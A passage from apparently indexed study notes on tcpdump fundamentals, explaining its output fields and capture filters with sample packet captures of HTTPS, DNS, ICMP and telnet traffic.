eth0 -w ~/output.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 10 packets captured 131 packets received by filter 0 packets dropped by kernel Reading Output From a File hrmns@htb[/htb]$ sudo tcpdump -r ~/output.pcap reading from file /home/trey/output.pcap, link-type EN10MB (Ethernet), snapshot length 262144 11:15:40.321509 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 2751910362:2751910399, ack 946558143, win 501, options [nop,nop,TS val 1368866401 ecr 65790024], length 37 11:15:40.337302 IP 172.16.146.2.55416 > 172.67.1.1.https: Flags [P.], seq 3766493458:3766493533, ack 4098207917, win 501, length 75 11:15:40.398103 IP 172.67.1.1.https > 172.16.146.2.55416: Flags [.], ack 75, win 73, length 0 11:15:40.457416 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [.], ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 0 11:15:40.458582 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [P.], seq 34:65, ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 31 11:15:40.458599 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 1, win 501, options [nop,nop,TS val 1368866538 ecr 65799068,nop,nop,sack 1 {34:65}], length 0 11:15:40.458643 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [P.], seq 1:34, ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 33 11:15:40.458655 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 65, win 501, options [nop,nop,TS val 1368866538 ecr 65799068], length 0 11:15:40.458915 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 37:68, ack 65, win 501, options [nop,nop,TS val 1368866539 ecr 65799068], length 31 11:15:40.458964 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [F.], seq 68, ack 65, win 501, options [nop,nop,TS val 1368866539 ecr 65799068], length 0","title":"Fundamentals"},{"location":"network_traffic_analysis/tcpdump_fundamentals/#tcpdump-output","text":"Tcpdump Shell Breakdown Filter Result Timestamp Yellow The timestamp field comes first and is configurable to show the time and date in a format we can ingest easily. Protocol Orange This section will tell us what the upper-layer header is. In our example, it shows IP. Source & Destination IP.Port Orange This will show us the source and destination of the packet along with the port number used to connect. Format == IP.port == 172.16.146.2.21 Flags Green This portion shows any flags utilized. Sequence and Acknowledgement Numbers Red This section shows the sequence and acknowledgment numbers used to track the TCP segment. Our example is utilizing low numbers to assume that relative sequence and ack numbers are being displayed. Protocol Options Blue Here, we will see any negotiated TCP values established between the client and server, such as window size, selective acknowledgments, window scale factors, and more. Notes / Next Header White Misc notes the dissector found will be present here. As the traffic we are looking at is encapsulated, we may see more header information for different protocols. In our example, we can see the TCPDump dissector recognizes FTP traffic within the encapsulation to display it for us.","title":"Tcpdump Output"},{"location":"network_traffic_analysis/tcpdump_fundamentals/#file-inputouput-with-tcpdump","text":"Save our PCAP Output to a File hrmns@htb[/htb]$ sudo tcpdump -i eth0 -w ~/output.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 10 packets captured 131 packets received by filter 0 packets dropped by kernel Reading Output From a File hrmns@htb[/htb]$ sudo tcpdump -r ~/output.pcap reading from file /home/trey/output.pcap, link-type EN10MB (Ethernet), snapshot length 262144 11:15:40.321509 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 2751910362:2751910399, ack 946558143, win 501, options [nop,nop,TS val 1368866401 ecr 65790024], length 37 11:15:40.337302 IP 172.16.146.2.55416 > 172.67.1.1.https: Flags [P.], seq 3766493458:3766493533, ack 4098207917, win 501, length 75 11:15:40.398103 IP 172.67.1.1.https > 172.16.146.2.55416: Flags [.], ack 75, win 73, length 0 11:15:40.457416 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [.], ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 0 11:15:40.458582 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [P.], seq 34:65, ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 31 11:15:40.458599 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 1, win 501, options [nop,nop,TS val 1368866538 ecr 65799068,nop,nop,sack 1 {34:65}], length 0 11:15:40.458643 IP ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.57236: Flags [P.], seq 1:34, ack 37, win 118, options [nop,nop,TS val 65799068 ecr 1368866401], length 33 11:15:40.458655 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 65, win 501, options [nop,nop,TS val 1368866538 ecr 65799068], length 0 11:15:40.458915 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 37:68, ack 65, win 501, options [nop,nop,TS val 1368866539 ecr 65799068], length 31 11:15:40.458964 IP 172.16.146.2.57236 > ec2-99-80-22-207.eu-west-1.compute.amazonaws.com.https: Flags [F.], seq 68, ack 65, win 501, options [nop,nop,TS val 1368866539 ecr 65799068], length 0","title":"File Input/Ouput with Tcpdump"},{"location":"network_traffic_analysis/tcpdump_packet_filtering/","text":"Helpful TCPDump Filters \u00b6 Filter Result host host will filter visible traffic to show anything involving the designated host. Bi-directional src / dest src and dest are modifiers. We can use them to designate a source or destination host or port. net net will show us any traffic sourcing from or destined to the network designated. It uses / notation. proto will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) port port is bi-directional. It will show any traffic with the specified port as the source or destination. portrange portrange allows us to specify a range of ports. (0-1024) less / greater \"< >\" less and greater can be used to look for a packet or protocol option of a specific size. and / && and && can be used to concatenate two different filters together. for example, src host AND port. or or allows for a match on either of two conditions. It does not have to meet both. It can be tricky. not not is a modifier saying anything but x. For example, not UDP. **Host Filter **(whatever IP we input will be checked for in the source or destination IP field) hrmns@htb[/htb]$ ### Syntax: host [ IP ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 host 172 .16.146.2 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 14:50:53.072536 IP 172.16.146.2.48738 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 3400465007:3400465044, ack 254421756, win 501, options [nop,nop,TS val 220968655 ecr 80852594], length 37 14:50:53.108740 IP 172.16.146.2.55606 > 172.67.1.1.https: Flags [P.], seq 4227143181:4227143273, ack 1980233980, win 21975, length 92 14:50:53.173084 IP 172.67.1.1.https > 172.16.146.2.55606: Flags [.], ack 92, win 69, length 0 14:50:53.175017 IP 172.16.146.2.35744 > 172.16.146.1.domain: 55991+ PTR? 148.199.31.52.in-addr.arpa. (44) 14:50:53.175714 IP 172.16.146.1.domain > 172.16.146.2.35744: 55991 1/0/0 PTR ec2-52-31-199-148.eu-west-1.compute.amazonaws.com. (107) Source/Destination Filter hrmns@htb[/htb]$ ### Syntax: src/dst [ host | net | port ] [ IP | Network Range | Port ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 src host 172 .16.146.2 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 14:53:36.199628 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 1428378231:1428378268, ack 3778572066, win 501, options [nop,nop,TS val 221131782 ecr 80889856], length 37 14:53:36.203166 IP 172.16.146.2.55606 > 172.67.1.1.https: Flags [P.], seq 4227144035:4227144103, ack 1980235221, win 21975, length 68 14:53:36.267059 IP 172.16.146.2.36424 > 172.16.146.1.domain: 40873+ PTR? 148.199.31.52.in-addr.arpa. (44) 14:53:36.267880 IP 172.16.146.2.51151 > 172.16.146.1.domain: 10032+ PTR? 2.146.16.172.in-addr.arpa. (43) 14:53:36.276425 IP 172.16.146.2.46588 > 172.16.146.1.domain: 28357+ PTR? 1.1.67.172.in-addr.arpa. (41) 14:53:36.337722 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 34, win 501, options [nop,nop,TS val 221131920 ecr 80899875], length 0 14:53:36.338841 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 65, win 501, options [nop,nop,TS val 221131921 ecr 80899875], length 0 14:53:36.339273 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 37:68, ack 66, win 501, options [nop,nop,TS val 221131922 ecr 80899875], length 31 14:53:36.339334 IP 172.16.146.2.48766 > ec2-52-31-199-148.eu-west-1.compute.amazonaws.com.https: Flags [F.], seq 68, ack 66, win 501, options [nop,nop,TS val 221131922 ecr 80899875], length 0 14:53:36.370791 IP 172.16.146.2.32972 > 172.16.146.1.domain: 3856+ PTR? 1.146.16.172.in-addr.arpa. (43) Utilizing Source With Port as a Filter hrmns@htb[/htb]$ sudo tcpdump -i eth0 tcp src port 80 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:08.993643 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1:1381, ack 480, win 6432, length 1380: HTTP: HTTP/1.1 200 OK 06:17:09.123830 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1381:2761, ack 480, win 6432, length 1380: HTTP 06:17:09.754737 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 2761:4141, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [P.], seq 4141:5521, ack 480, win 6432, length 1380: HTTP 06:17:09.945011 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 5521:6901, ack 480, win 6432, length 1380: HTTP Using Destination in Combination with the Net Filter (we are looking for anything destined for the 172.16.146.0/24 network) hrmns@htb[/htb]$ sudo tcpdump -i eth0 dest net 172 .16.146.2.0/24 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 16:33:14.376003 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], ack 1486880537, win 316, options [nop,nop,TS val 2311579424 ecr 263866084], length 0 16:33:14.442123 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 0:385, ack 1, win 316, options [nop,nop,TS val 2311579493 ecr 263866084], length 385 16:33:14.442188 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 385:1803, ack 1, win 316, options [nop,nop,TS val 2311579493 ecr 263866084], length 1418 16:33:14.442223 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 1803:4639, ack 1, win 316, options [nop,nop,TS val 2311579494 ecr 263866084], length 2836 16:33:14.443161 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [P.], seq 4639:5817, ack 1, win 316, options [nop,nop,TS val 2311579495 ecr 263866084], length 1178 16:33:14.443199 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 5817:8653, ack 1, win 316, options [nop,nop,TS val 2311579495 ecr 263866084], length 2836 16:33:14.444407 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 8653:10071, ack 1, win 316, options [nop,nop,TS val 2311579497 ecr 263866084], length 1418 16:33:14.445479 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 10071:11489, ack 1, win 316, options [nop,nop,TS val 2311579497 ecr 263866084], length 1418 16:33:14.445531 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 11489:12907, ack 1, win 316, options [nop,nop,TS val 2311579498 ecr 263866084], length 1418 16:33:14.446955 IP 64.233.177.103.443 > 172.16.146.2.36050: Flags [.], seq 12907:14325, ack 1, win 316, options [nop,nop,TS val 2311579498 ecr 263866084], length 1418 Protocol Filter hrmns@htb[/htb]$ ### Syntax: [ tcp/udp/icmp ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 udp 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3009 > 145.253.2.203.domain: 35+ A? pagead2.googlesyndication.com. (47) 06:17:10.225414 IP 145.253.2.203.domain > dialin-145-254-160-237.pools.arcor-ip.net.3009: 35 4/0/0 CNAME pagead2.google.com., CNAME pagead.google.akadns.net., A 216.239.59.104, A 216.239.59.99 (146) Protocol Number Filter ( resource for a helpful list covering protocol numbers) hrmns@htb[/htb]$ ### Syntax: proto [ protocol number ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 proto 17 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3009 > 145.253.2.203.domain: 35+ A? pagead2.googlesyndication.com. (47) 06:17:10.225414 IP 145.253.2.203.domain > dialin-145-254-160-237.pools.arcor-ip.net.3009: 35 4/0/0 CNAME pagead2.google.com., CNAME pagead.google.akadns.net., A 216.239.59.104, A 216.239.59.99 (146) Port Filter hrmns@htb[/htb]$ ### Syntax: port [ port number ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 tcp port 443 06:17:07.311224 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [S], seq 951057939, win 8760, options [mss 1460,nop,nop,sackOK], length 0 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1, win 9660, length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [P.], seq 1:480, ack 1, win 9660, length 479: HTTP: GET /download.html HTTP/1.1 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:08.993643 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1:1381, ack 480, win 6432, length 1380: HTTP: HTTP/1.1 200 OK 06:17:09.123830 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1381, win 9660, length 0 06:17:09.123830 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 1381:2761, ack 480, win 6432, length 1380: HTTP 06:17:09.324118 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 2761, win 9660, length 0 06:17:09.754737 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 2761:4141, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [P.], seq 4141:5521, ack 480, win 6432, length 1380: HTTP 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 5521, win 9660, length 0 06:17:09.945011 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 5521:6901, ack 480, win 6432, length 1380: HTTP 06:17:10.125270 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 6901, win 9660, length 0 06:17:10.205385 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], seq 6901:8281, ack 480, win 6432, length 1380: HTTP 06:17:10.295515 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [P.], seq 918691368:918692089, ack 778785668, win 8760, length 721: HTTP: GET /pagead/ads?client=ca-pub-2309191948673629&random=1084443430285&lmt=1082467020&format=468x60_as&output=html&url=http%3A%2F%2Fwww.ethereal.com%2Fdownload.html&color_bg=FFFFFF&color_text=333333&color_link=000000&color_url=666633&color_border=666633 HTTP/1.1 Port Range Filter hrmns@htb[/htb]$ ### Syntax: portrange [ portrange 0 -65535 ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 portrange 0 -1024 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 13:10:35.092477 IP 172.16.146.1.domain > 172.16.146.2.32824: 47775 1/0/0 CNAME autopush.prod.mozaws.net. (81) 13:10:35.093217 IP 172.16.146.2.48078 > 172.16.146.1.domain: 30234+ A? ocsp.pki.goog. (31) 13:10:35.093334 IP 172.16.146.2.48078 > 172.16.146.1.domain: 32024+ AAAA? ocsp.pki.goog. (31) 13:10:35.136255 IP 172.16.146.1.domain > 172.16.146.2.48078: 32024 2/0/0 CNAME pki-goog.l.google.com., AAAA 2607:f8b0:4002:c09::5e (94) 13:10:35.137348 IP 172.16.146.1.domain > 172.16.146.2.48078: 30234 2/0/0 CNAME pki-goog.l.google.com., A 172.217.164.67 (82) 13:10:35.137989 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [S], seq 1146136517, win 64240, options [mss 1460,sackOK,TS val 1337520268 ecr 0,nop,wscale 7], length 0 13:10:35.174443 IP atl26s18-in-f3.1e100.net.http > 172.16.146.2.55074: Flags [S.], seq 345110814, ack 1146136518, win 65535, options [mss 1430,sackOK,TS val 1000152427 ecr 1337520268,nop,wscale 8], length 0 13:10:35.174481 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1337520304 ecr 1000152427], length 0 13:10:35.174716 IP 172.16.146.2.55074 > atl26s18-in-f3.1e100.net.http: Flags [P.], seq 1:379, ack 1, win 502, options [nop,nop,TS val 1337520305 ecr 1000152427], length 378: HTTP: POST /gts1o1core HTTP/1.1 13:10:35.208007 IP atl26s18-in-f3.1e100.net.http > 172.16.146.2.55074: Flags [.], ack 379, win 261, options [nop,nop,TS val 1000152462 ecr 1337520305], length 0 Less/Greater Filter (Looking for any packet less than 64 bytes. If we are looking to capture traffic that includes a file transfer or set of files. We know these files will be larger than regular traffic) hrmns@htb[/htb]$ ### Syntax: less/greater [ size in bytes ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 less 64 06:17:07.311224 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [S], seq 951057939, win 8760, options [mss 1460,nop,nop,sackOK], length 0 06:17:08.222534 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [S.], seq 290218379, ack 951057940, win 5840, options [mss 1380,nop,nop,sackOK], length 0 06:17:08.222534 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1, win 9660, length 0 06:17:08.783340 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 480, win 6432, length 0 06:17:09.123830 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 1381, win 9660, length 0 06:17:09.324118 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 2761, win 9660, length 0 06:17:09.864896 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 5521, win 9660, length 0 06:17:10.125270 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 6901, win 9660, length 0 06:17:10.325558 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 8281, win 9660, length 0 06:17:10.806249 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 11041, win 9660, length 0 06:17:10.956465 IP 216.239.59.99.http > dialin-145-254-160-237.pools.arcor-ip.net.3371: Flags [.], ack 918692089, win 31460, length 0 06:17:11.126710 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 12421, win 9660, length 0 06:17:11.266912 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [.], ack 1590, win 8760, length 0 06:17:11.527286 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 13801, win 9660, length 0 06:17:11.667488 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 16561, win 9660, length 0 06:17:11.807689 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 17941, win 9660, length 0 06:17:12.088092 IP dialin-145-254-160-237.pools.arcor-ip.net.3371 > 216.239.59.99.http: Flags [.], ack 1590, win 8760, length 0 06:17:12.328438 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 18365, win 9236, length 0 06:17:25.216971 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [F.], seq 18365, ack 480, win 6432, length 0 06:17:25.216971 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [.], ack 18366, win 9236, length 0 06:17:37.374452 IP dialin-145-254-160-237.pools.arcor-ip.net.3372 > 65.208.228.223.http: Flags [F.], seq 480, ack 18366, win 9236, length 0 06:17:37.704928 IP 65.208.228.223.http > dialin-145-254-160-237.pools.arcor-ip.net.3372: Flags [.], ack 481, win 6432, length 0 Utilizing Greater hrmns@htb[/htb]$ sudo tcpdump -i eth0 greater 500 21:12:43.548353 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [P.], seq 401695766:401696254, ack 2579866052, win 17376, options [nop,nop,TS val 2467382 ecr 10234152], length 488 E...;...@.................d.......C........ .%.6..)(Warning: no Kerberos tickets issued. OpenBSD 2.6-beta (OOF) #4: Tue Oct 12 20:42:32 CDT 1999 Welcome to OpenBSD: The proactively secure Unix-like operating system. Please use the sendbug(1) utility to report bugs in the system. Before reporting a bug, please try to reproduce it with the latest version of the code. With bug reports, please try to ensure that enough information to reproduce the problem is enclosed, and if a known fix for it exists, include that as well. AND Filter hrmns@htb[/htb]$ ### Syntax: and [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -i eth0 host 192 .168.0.1 and port 23 21:12:38.387203 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [S], seq 2579865836, win 32120, options [mss 1460,sackOK,TS val 10233636 ecr 0,nop,wscale 0], length 0 21:12:38.389728 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [S.], seq 401695549, ack 2579865837, win 17376, options [mss 1448,nop,wscale 0,nop,nop,TS val 2467372 ecr 10233636], length 0 21:12:38.389775 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [.], ack 1, win 32120, options [nop,nop,TS val 10233636 ecr 2467372], length 0 21:12:38.391363 IP 192.168.0.2.1550 > 192.168.0.1.telnet: Flags [P.], seq 1:28, ack 1, win 32120, options [nop,nop,TS val 10233636 ecr 2467372], length 27 [telnet DO SUPPRESS GO AHEAD, WILL TERMINAL TYPE, WILL NAWS, WILL TSPEED, WILL LFLOW, WILL LINEMODE, WILL NEW-ENVIRON, DO STATUS, WILL XDISPLOC] 21:12:38.537538 IP 192.168.0.1.telnet > 192.168.0.2.1550: Flags [P.], seq 1:4, ack 28, win 17349, options [nop,nop,TS val 2467372 ecr 10233636], length 3 [telnet DO AUTHENTICATION] OR Filter hrmns@htb[/htb]$ ### Syntax: or/ || [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -r sus.pcap icmp or host 172 .16.146.1 reading from file sus.pcap, link-type EN10MB (Ethernet), snapshot length 262144 14:54:03.659163 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 21, length 64 14:54:03.691278 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 21, length 64 14:54:03.879882 ARP, Request who-has 172.16.146.1 tell 172.16.146.2, length 28 14:54:03.880266 ARP, Reply 172.16.146.1 is-at 8a:66:5a:11:8d:64 (oui Unknown), length 46 14:54:04.661179 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 22, length 64 14:54:04.687120 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 22, length 64 14:54:05.663097 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 23, length 64 14:54:05.686092 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 23, length 64 14:54:06.664174 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 24, length 64 14:54:06.697469 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 24, length 64 14:54:07.666273 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 25, length 64 14:54:07.701475 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 25, length 64 14:54:08.668364 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 26, length 64 14:54:08.694948 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 26, length 64 14:54:09.670523 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 27, length 64 14:54:09.694974 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 27, length 64 14:54:10.672858 IP 172.16.146.2 > dns.google: ICMP echo request, id 51661, seq 28, length 64 14:54:10.697834 IP dns.google > 172.16.146.2: ICMP echo reply, id 51661, seq 28, length 64 NOT Filter hrmns@htb[/htb]$ ### Syntax: not/! [ requirement ] hrmns@htb[/htb]$ sudo tcpdump -r sus.pcap not icmp 14:54:03.879882 ARP, Request who-has 172.16.146.1 tell 172.16.146.2, length 28 14:54:03.880266 ARP, Reply 172.16.146.1 is-at 8a:66:5a:11:8d:64 (oui Unknown), length 46 14:54:16.541657 IP 172.16.146.2.55592 > ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https: Flags [P.], seq 3569937476:3569937513, ack 2948818703, win 501, options [nop,nop,TS val 713252991 ecr 12282469], length 37 14:54:16.568659 IP 172.16.146.2.53329 > 172.16.146.1.domain: 24866+ A? app.hackthebox.eu. (35) 14:54:16.616032 IP 172.16.146.1.domain > 172.16.146.2.53329: 24866 3/0/0 A 172.67.1.1, A 104.20.66.68, A 104.20.55.68 (83) 14:54:16.616396 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [S], seq 2697802378, win 64240, options [mss 1460,sackOK,TS val 533261003 ecr 0,nop,wscale 7], length 0 14:54:16.637895 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [S.], seq 752000032, ack 2697802379, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 14:54:16.637937 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [.], ack 1, win 502, length 0 14:54:16.644551 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [P.], seq 1:514, ack 1, win 502, length 513 14:54:16.667236 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [.], ack 514, win 66, length 0 14:54:16.668307 IP 172.67.1.1.https > 172.16.146.2.56204: Flags [P.], seq 1:2766, ack 514, win 66, length 2765 14:54:16.668319 IP 172.16.146.2.56204 > 172.67.1.1.https: Flags [.], ack 2766, win 496, length 0 14:54:16.670536 IP ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https > 172.16.146.2.55592: Flags [P.], seq 1:34, ack 37, win 114, options [nop,nop,TS val 12294021 ecr 713252991], length 33 14:54:16.670559 IP 172.16.146.2.55592 > ec2-52-211-164-46.eu-west-1.compute.amazonaws.com.https: Flags [.], ack 34, win 501, options [nop,nop,TS val 713253120 ecr 12294021], length 0 Piping a Capture to Grep hrmns@htb[/htb]$ sudo tcpdump -Ar http.cap -l | grep 'mailto:*' reading from file http.cap, link-type EN10MB (Ethernet), snapshot length 65535 <a href=\"mailto:ethereal-web[AT]ethereal.com\">ethereal-web[AT]ethereal.com</a> <a href=\"mailto:free-support[AT]thewrittenword.com\">free-support[AT]thewrittenword.com</a> <a href=\"mailto:ethereal-users[AT]ethereal.com\">ethereal-users[AT]ethereal.com</a> <a href=\"mailto:ethereal-web[AT]ethereal.com\">ethereal-web[AT]ethereal.com</a> Looking for TCP Protocol Flags hrmns@htb[/htb]$ tcpdump -i eth0 'tcp[13] & 2 != 0' Hunting For a SYN Flag hrmns@htb[/htb]$ sudo tcpdump -i eth0 'tcp[13] &2 != 0' tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 15:18:14.630993 IP 172.16.146.2.56244 > 172.67.1.1.https: Flags [S], seq 122498858, win 64240, options [mss 1460,sackOK,TS val 534699017 ecr 0,nop,wscale 7], length 0 15:18:14.654698 IP 172.67.1.1.https > 172.16.146.2.56244: Flags [S.], seq 3728841459, ack 122498859, win 65535, options [mss 1400,nop,nop,sackOK,nop,wscale 10], length 0 15:18:15.017464 IP 172.16.146.2.60202 > 